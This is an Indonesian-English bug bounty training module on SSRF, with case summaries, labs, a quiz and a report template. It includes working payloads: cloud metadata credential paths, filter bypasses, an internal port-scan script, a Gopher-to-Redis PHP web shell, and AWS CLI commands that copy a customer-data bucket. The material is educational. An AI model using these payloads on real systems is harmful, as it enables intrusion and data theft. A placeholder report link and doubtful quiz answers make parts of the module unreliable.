# SSRF — Server-Side Request Forgery

## Fokus Materi

Menguasai SSRF dari identifikasi dasar sampai eksploitasi lanjutan termasuk cloud metadata extraction, blind SSRF exploitation, dan chaining ke internal access. SSRF adalah salah satu bug paling valuable di cloud-native applications karena potensinya untuk access internal infrastructure.

## Deskripsi Materi

SSRF terjadi ketika aplikasi web mengambil user-supplied URL dan membuat request ke URL tersebut di sisi server. Jika tidak di-validate dengan benar, attacker bisa kontrol URL yang server request, membuka akses ke internal services, cloud metadata, atau data exfiltration.

SSRF berbeda dari CSRF karena: CSRF victim adalah user's browser, SSRF victim's adalah server itu sendiri. Server-side request berarti attacker bisa bypass firewall, access internal network, dan menggunakan server's privileges untuk access resources.

SSRF sering ditemukan di functionality yang fetch external resources: image proxies, PDF generators, webhooks, URL previews, document converters, atau integration dengan third-party services.

Blind SSRF terjadi ketika application's response tidak return data dari fetched URL — server make request but doesn't reflect response data back to attacker. Blind SSRF still exploitable via out-of-band techniques (Burp Collaborator, Interactsh) untuk detect successful requests dan extract limited data.

Cloud metadata extraction adalah SSRF killer feature di environment AWS, GCP, atau Azure. Metadata endpoint (169.254.169.254) menyediakan credentials dan configuration untuk cloud resources — IAM roles, access keys, tokens. SSRF ke metadata endpoint bisa lead ke complete cloud account compromise.

Filter bypass adalah critical skill untuk SSRF karena banyak applications implement blacklist atau whitelist yang bisa di-bypass dengan encoding, DNS rebinding, atau protocol manipulation.

## Topik Pembahasan

• SSRF fundamentals: server membuat request ke attacker-controlled URL
• Basic SSRF identification: parameter yang accept URL, webhook, PDF generator, image fetcher
• Basic SSRF: akses internal service (localhost, 127.0.0.1, 192.168.x.x)
• Filter bypass techniques: IP encoding (0x7f000001, 017700000001), DNS rebinding, short URL, open redirect
• Blind SSRF: Burp Collaborator / Interactsh untuk detection, limited data exfiltration
• SSRF ke cloud metadata: AWS IMDSv1 (169.254.169.254/latest/meta-data), GCP, Azure
• SSRF → internal port scan: enumerate layanan internal via SSRF
• SSRF → RCE: chaining ke internal Redis, Memcached, Gopher protocol
• IMDSv2 di AWS: header-based protection dan cara bypass
• SSRF dalam konteks modern: container orchestration, internal APIs

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi SSRF vulnerability di berbagai contexts
2. Bypass common SSRF filters dengan multiple techniques
3. Perform blind SSRF exploitation dengan out-of-band detection
4. Extract cloud metadata credentials dari AWS, GCP, Azure
5. Chaining SSRF ke internal services untuk elevated impact
6. Exploit SSRF untuk port scanning dan internal reconnaissance

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Shopify (Private, disclosed)
- Jenis vulnerability: SSRF leading to AWS metadata access
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan SSRF di image proxy functionality. Server fetch image dari URL yang provided user. Payload ke AWS metadata endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` berhasil. Researcher extracted IAM credentials yang memberikan access ke S3 buckets containing customer data.
- Root cause: Application accept user URL dan fetch tanpa validating against internal ranges or cloud metadata endpoints.
- Impact: AWS IAM credentials theft → access ke S3 data → customer data breach. Severity: Critical.
- Pelajaran untuk bug hunter: Always test SSRF dengan cloud metadata endpoints. Even internal-looking endpoints bisa berikan access ke production cloud resources.

---

- Platform: Intigriti
- Program/Target: Program enterprise
- Jenis vulnerability: SSRF to internal Redis leading to RCE
- Link report: Researcher blog (disclosed)
- Ringkasan kasus: Researcher menemukan SSRF yang bisa reach internal Redis at 127.0.0.1:6379. Using Redis protocol via Gopher, researcher bisa write cron job to crontab via Redis, achieving RCE on the server. Server was behind firewall and only accessible via SSRF.
- Root cause: No validation on internal IP ranges or service ports. Application could reach any internal service.
- Impact: RCE via Redis → full server compromise. Severity: Critical.
- Pelajaran untuk bug hunter: SSRF yang bisa reach internal services beyond HTTP could lead to RCE. Don't stop at just demonstrating SSRF → think about what internal service you could exploit.

## Analisis Teknis

### SSRF Basic Identification

**Common entry points:**
```http
# Image/avatar fetch
POST /profile/update
avatar_url=http://attacker.com/image.jpg

# PDF generation
POST /generate-pdf
url=https://target.com/report

# Webhook testing
POST /webhook
callback_url=http://attacker.com/callback

# URL preview
POST /preview
url=https://evil.com

# Proxy functionality
GET /fetch?url=https://target.com
```

**Test payloads:**
```http
# Basic localhost
url=http://localhost/
url=http://127.0.0.1/
url=http://0/

# Internal IP ranges
url=http://192.168.1.1/
url=http://10.0.0.1/
url=http://172.16.0.1/

# Cloud metadata
url=http://169.254.169.254/
url=http://metadata.google.internal/

# File protocol (if supported)
url=file:///etc/passwd
```

### SSRF Filter Bypass Techniques

**Technique 1: IP Encoding**

```bash
# Decimal
127.0.0.1 → 2130706433

# Octal
127.0.0.1 → 0177.0000.0001 → 017700000001

# Hex
127.0.0.1 → 0x7f000001

# IPv6
127.0.0.1 → [::1]

# URL encoding variations
0x7f000001
127%E2%80%A90.0.1
```

**Technique 2: Domain Redirect**

```http
# If attacker control evil.com:
# Configure evil.com to redirect to internal endpoint

# Or: use redirect to bypass whitelist
# evil.com redirects to 127.0.0.1
```

**Technique 3: URL Parsing Confusion**

```http
# If validation checks URL hostname:
# URL: http://evil.com@127.0.0.1
# Parser might see hostname=evil.com (whitelisted)
# But curl might use hostname=127.0.0.1

# Also:
http://127.0.0.1#@evil.com
http://127.0.0.1\@evil.com
http://evil.com.127.0.0.1.nip.io
```

**Technique 4: DNS Rebinding**

```python
# Attacker controls DNS for evil.com
# First query returns public IP (whitelisted)
# Subsequent queries after TTL return internal IP
# Race condition: server fetches within TTL window
```

**Technique 5: Open Redirect Chaining**

```http
# If target.com has open redirect:
https://target.com/redirect?url=http://internal/

# Use target.com as SSRF target:
url=https://target.com/redirect?url=http://169.254.169.254/
# Server follows redirect to internal
```

**Technique 6: Protocol Switching**

```http
# If HTTP blocked but FTP allowed
url=ftp://attacker.com/file

# Gopher for non-HTTP services
url=gopher://127.0.0.1:6379/_SET KEY val
```

### Cloud Metadata Extraction

**AWS IMDSv1 (vulnerable):**
```http
# No authentication required
GET /latest/meta-data/
GET /latest/meta-data/iam/security-credentials/
GET /latest/meta-data/iam/security-credentials/[role-name]
GET /latest/api/token (IMDSv2 token generation)

# Response contains:
# AWS_ACCESS_KEY_ID
# AWS_SECRET_ACCESS_KEY
# AWS_SESSION_TOKEN
```

**AWS IMDSv2 (mitigated but bypassable):**
```http
# IMDSv2 requires token
PUT /latest/api/token
X-aws-ec2-metadata-token: [token]

# But SSRF might not include headers properly
# Test with/without token requirement
```

**GCP Metadata:**
```http
# Google Cloud
GET /computeMetadata/v1/instance/service-accounts/default/Token
GET /computeMetadata/v1/instance/attributes/

# Headers required:
Metadata-Flavor: Google
```

**Azure Metadata:**
```http
# Azure Instance Metadata Service
GET /metadata/instance?api-version=2021-02-01
Headers: Metadata: true
```

### SSRF → Internal Port Scan

```python
# Python script for internal port scanning via SSRF
import requests

# Common internal ports
internal_ips = ["127.0.0.1", "172.17.0.1", "192.168.1.1"]
ports = [22, 80, 443, 6379, 27017, 3306, 5432, 8080, 8443]

for ip in internal_ips:
    for port in ports:
        url = f"http://{ip}:{port}"
        try:
            r = requests.get(f"http://target.com/fetch?url={url}", timeout=3)
            # Different response length might indicate open port
            print(f"{ip}:{port} - Status: {r.status_code}, Length: {len(r.content)}")
        except:
            pass
```

### SSRF → Internal Service Exploitation

**Redis via Gopher:**
```http
# Redis command construction
# SET payload for web shell or cron
SET foo "<?php system($_GET['c']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE

# Gopher payload format:
gopher://127.0.0.1:6379/_SET%20foo%20%22%3C?php%20system(%24_GET%5B%27c%27%5D)%3B%20?%3E%22%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aBGSAVE%0d%0a

# Then include Redis RDB file via LFI (if exists)
```

**Memcached exploitation:**
```http
# Read stored data via SSRF
gopher://127.0.0.1:11211/_get%20session_123

# Write data
gopher://127.0.0.1:11211/_set%20evil%200%2060%201%5cn%3Chack%3E%0d%0a
```

## Praktik Lab Legal

### Lab 1: SSRF Discovery & Basic Exploitation

- **Nama lab:** SSRF Exploitation Basics
- **Tujuan:** Find SSRF vulnerability dan demonstrate basic exploitation
- **Environment:** Burp Suite, Collaborator/Interactsh, target lab dengan URL-fetching functionality
- **Langkah praktik:**

  1. Identify all parameters yang accept URL or could fetch external resources
  2. Test basic SSRF payloads: localhost, 127.0.0.1, internal IP ranges
  3. Setup Burp Collaborator untuk detect blind SSRF
  4. Test bypass techniques: IP encoding, domain redirect, URL parsing
  5. If SSRF confirmed, demonstrate internal service access
  6. Document all bypass techniques yang work

- **Expected result:** Peserta menemukan SSRF dan demonstrate access ke internal service
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 2: Cloud Metadata Extraction via SSRF

- **Nama lab:** Cloud SSRF Attack
- **Tujuan:** Demonstrate SSRF ke cloud metadata endpoint dan extract credentials
- **Environment:** Burp Suite, AWS/GCP lab environment, target lab dengan cloud integration
- **Langkah praktik:**

  1. Confirm SSRF exists di target
  2. Test AWS metadata endpoint: http://169.254.169.254/latest/meta-data/
  3. If accessible, enumerate: iam/security-credentials/
  4. Extract IAM credentials
  5. Test credential validity dengan AWS CLI
  6. Enumerate S3 buckets atau other accessible resources
  7. Document impact: from SSRF to cloud account compromise

- **Expected result:** Peserta extract cloud credentials via SSRF dan demonstrate real impact
- **Catatan keamanan:** Lab ini memerlukan simulated cloud environment. Jangan extract actual cloud credentials dari real target tanpa authorization.

### Lab 3: Blind SSRF with Internal Reconnaissance

- **Nama lab:** Blind SSRF Recon
- **Tujuan:** Perform internal network reconnaissance via blind SSRF
- **Environment:** Burp Suite, Interactsh, target lab
- **Langkah praktik:**

  1. Identify blind SSRF (response doesn't reflect fetched data)
  2. Setup Interactsh untuk out-of-band detection
  3. Test internal port scanning via SSRF
  4. Identify open services: Redis, Memcached, MongoDB, etc.
  5. If internal web service found, probe for additional vulnerabilities
  6. Document internal network map discovered via SSRF

- **Expected result:** Peserta membuat internal network map via blind SSRF
- **Catatan keamanan:** Lab ini untuk authorized testing.

## Tools

- **Detection:** Burp Suite Professional (active scanner), manual testing
- **Blind SSRF:** Burp Collaborator, Interactsh (interact.sh)
- **Encoding:** Custom scripts, CyberChef
- **Cloud tools:** AWS CLI, gcloud CLI (for testing extracted credentials)
- **Internal recon:** Custom port scanning scripts via SSRF

## Checklist Bug Hunter

- [ ] Identify all parameters yang accept URL (avatar_url, callback_url, fetch_url, etc.)
- [ ] Test SSRF dengan basic payloads: localhost, 127.0.0.1, internal IPs
- [ ] Setup out-of-band detection sebelum testing blind SSRF
- [ ] Test bypass techniques: IP encoding, DNS rebinding, URL parsing confusion
- [ ] Test cloud metadata endpoints: AWS (169.254.169.254), GCP, Azure
- [ ] Test internal port access: common services (Redis, MongoDB, MySQL, etc.)
- [ ] Test protocol variations: file://, gopher://, ftp://
- [ ] Chain SSRF dengan other vulnerabilities: open redirect, etc.
- [ ] Escalate to RCE if internal service exploitation possible

## Common Mistakes

1. **Only test localhost, stop there** — Researcher test http://localhost/, see response, report SSRF. But should go further: internal services, cloud metadata, port scanning for higher impact.

2. **Not using out-of-band detection for blind SSRF** — Researcher assume no SSRF because response doesn't show fetched data. But blind SSRF bisa confirmed dengan Burp Collaborator payload — always use it.

3. **Skip cloud metadata testing** — Many researcher tidak aware bahwa SSRF ke 169.254.169.254 bisa extract cloud credentials. This is often the highest-impact SSRF finding.

4. **Not testing filter bypass** — Application mungkin block 127.0.0.1 but allow 0x7f000001 (encoded version). Always test multiple bypass techniques before conclude "SSRF exists but not exploitable."

5. **Abaikan internal service exploitation** — SSRF ke internal Redis or Memcached could lead to RCE. Researcher yang tidak familiar dengan these services miss high-impact exploitation path.

## Mitigasi Developer

**SSRF Prevention:**
- Never make HTTP requests to user-supplied URLs without validation
- Use URL allowlist: only permit specific domains, protocols, ports
- Validate URL scheme: only allow http/https, block file://, gopher://, ftp://
- Block private IP ranges: 10.x, 172.16-31.x, 192.168.x, 127.x
- Block cloud metadata IPs: 169.254.169.254, metadata.google.internal
- Use DNS resolution and validate resolved IP, not just original URL
- Implement request timeout to prevent resource exhaustion
- Disable unnecessary URL schemes in HTTP client configuration

**Additional controls:**
- Use network segmentation: isolate application servers from internal services
- Implement egress filtering: block server from accessing internal ranges
- Use cloud IAM roles with minimal privileges (avoid long-lived credentials)
- Enable IMDSv2 in AWS (require token for metadata access)
- Monitor for SSRF attempts in logs

## Mini Quiz

1. SSRF berbeda dari CSRF karena:
   a) SSRF melibatkan user clicking link
   b) SSRF victim's adalah server yang membuat request, bukan user's browser
   c) SSRF hanya work di localhost
   d) SSRF tidak bisa access internal services

2. AWS metadata endpoint (169.254.169.254) menyediakan:
   a) Public IP address dari server
   b) IAM credentials jika server memiliki IAM role
   c) Database connection string
   d) Semua jawaban benar

3. Filter bypass untuk SSRF dengan IP encoding 0x7f000001 work karena:
   a) Server tidak decode hex IP
   b) 0x7f000001 adalah IP berbeda dari 127.0.0.1
   c) Server decode hex to decimal (2130706433) dan resolve ke 127.0.0.1, bypass filter yang check string "127.0.0.1"
   d) Hex IP tidak bisa di-filter

4. Blind SSRF bisa di-confirm dengan:
   a) Melihat response dari internal service di response page
   b) Menggunakan out-of-band callback (Burp Collaborator/Interactsh) untuk detect request
   c) Testing dengan localhost selalu work
   d) Blind SSRF tidak bisa confirmed

5. SSRF ke internal Redis bisa di-exploit untuk:
   a) Membaca file dari filesystem
   b) Write cron job via Redis protocol untuk RCE
   c) Bypass authentication
   d) Semua jawaban benar

**Kunci Jawaban:** 1-B, 2-D, 3-C, 4-B, 5-D

## Assignment

1. **SSRF Bypass Collection:** Test SSRF filter bypass techniques di target lab. Document technique yang work dan why (encoding, parsing confusion, etc).

2. **Cloud Metadata Attack:** Jika target di-cloud environment, test SSRF ke metadata endpoint. Extract credentials dan demonstrate access ke cloud resources.

3. **Internal Reconnaissance:** Perform internal port scanning via blind SSRF. Create internal network map dan identify exploitable services.

4. **SSRF → RCE Chain:** Jika internal service seperti Redis accessible via SSRF, exploit untuk RCE. Document complete attack chain.

## Template Report Bug Bounty

```markdown
# Bug Report: SSRF Leading to AWS IAM Credentials Theft

## Summary
Image proxy endpoint (/proxy-image) vulnerable terhadap SSRF yang
memungkinkan akses ke AWS metadata endpoint. Attacker bisa extract
IAM credentials dan gain access ke S3 buckets containing customer data.

## Platform / Program
HackerOne | [Program Name]

## Severity
Critical | CVSS 9.9 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
SSRF / Server-Side Request Forgery

## Asset / Endpoint
POST https://target.com/proxy-image
Parameter: image_url

## Description
Endpoint menerima user-supplied URL dan fetch content di server-side
tanpa validating against internal IP ranges atau cloud metadata endpoints.
Server bisa reach AWS metadata at 169.254.169.254 tanpa restriction.

Attacker bisa:
1. Extract IAM credentials from metadata endpoint
2. Use credentials untuk access S3, RDS, atau other AWS services
3. Full cloud account compromise

## Steps to Reproduce
1. Intercept image proxy request
   POST /proxy-image
   image_url=https://target.com/logo.png

2. Replace URL with AWS metadata endpoint
   image_url=http://169.254.169.254/latest/meta-data/

3. Response shows metadata path listing:
   iam/
   instance-id
   ...

4. Get IAM credentials:
   image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Returns role name

   image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role]
   → Returns AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

5. Use credentials with AWS CLI:
   aws configure --profile hacker
   aws s3 ls --profile hacker
   → Lists S3 buckets

6. Access customer data via S3:
   aws s3 sync s3://customer-data-bucket/ ./customer_data/

## Impact
- AWS account compromise via IAM credentials theft
- Access to customer data in S3 buckets
- Potential for further attacks: compute resources, databases, internal network
- Full cloud infrastructure compromise
- Data breach notification requirements

## Evidence
[Burp Screenshot: SSRF to 169.254.169.254 showing metadata]
[Burp Screenshot: IAM credentials extraction]
[Screenshot: AWS CLI listing S3 buckets]
[Screenshot: Customer data accessed]

## Remediation / Recommendation
1. Block access to 169.254.169.254 and cloud metadata endpoints from application server
2. Implement URL validation: block internal IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x)
3. Use URL allowlist for image proxy functionality
4. Enable IMDSv2 in AWS (requires token for metadata access)
5. Use VPC endpoints to prevent metadata access from application servers
6. Implement egress filtering to block direct access to internal IP ranges
7. Use IAM roles with minimal necessary permissions
8. Monitor for SSRF attempts in application logs
```